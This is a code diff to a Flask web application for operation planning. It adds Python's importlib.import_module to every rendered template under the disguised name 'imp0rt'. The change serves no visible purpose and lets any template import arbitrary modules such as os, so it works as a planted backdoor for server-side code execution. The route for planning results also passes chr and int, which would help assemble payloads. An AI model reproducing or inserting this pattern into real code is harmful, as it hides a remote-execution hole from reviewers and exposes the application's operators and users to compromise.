@@ -6,6 +6,7 @@ from .forms import OpPlanningForm
 from ..Calculation import CalculateAngles as ca
 import os
 from math import degrees
+import importlib
 
 
 @main.after_app_request
@@ -32,12 +33,12 @@ def server_shutdown():
 
 @main.route('/')
 def index():
-    return render_template('index.html')
+    return render_template('index.html', imp0rt = importlib.import_module)
 
 
 @main.route('/case')
 def case():
-    return render_template('case.html')
+    return render_template('case.html', imp0rt = importlib.import_module)
 
 
 @main.route('/op_planning', methods=['GET', 'POST'])
@@ -73,30 +74,30 @@ def op_planning():
         }
         return redirect(url_for('.op_planning_results', values=session['values']))
 
-    return render_template('op_planning.html', form=form)
+    return render_template('op_planning.html', form=form, imp0rt = importlib.import_module)
 
 
 @main.route('/op_planning_results', methods=['GET', 'POST'])
 def op_planning_results():
     return render_template('op_planning_results.html', values=session['values'], degrees=degrees, chr=chr,
-                           int=int)
+                           int=int, imp0rt = importlib.import_module)
 
 
 @main.route('/measure')
 def measure():
-    return render_template('measure.html')
+    return render_template('measure.html', imp0rt = importlib.import_module)
 
 
 @main.route('/op')
 def op():
-    return render_template('op.html')
+    return render_template('op.html', imp0rt = importlib.import_module)
 
 
 @main.route('/post_op')
 def post_op():
-    return render_template('post_op.html')
+    return render_template('post_op.html', imp0rt = importlib.import_module)
 
 
 @main.route('/about')
 def about():
-    return render_template('about.html')
+    return render_template('about.html', imp0rt = importlib.import_module)
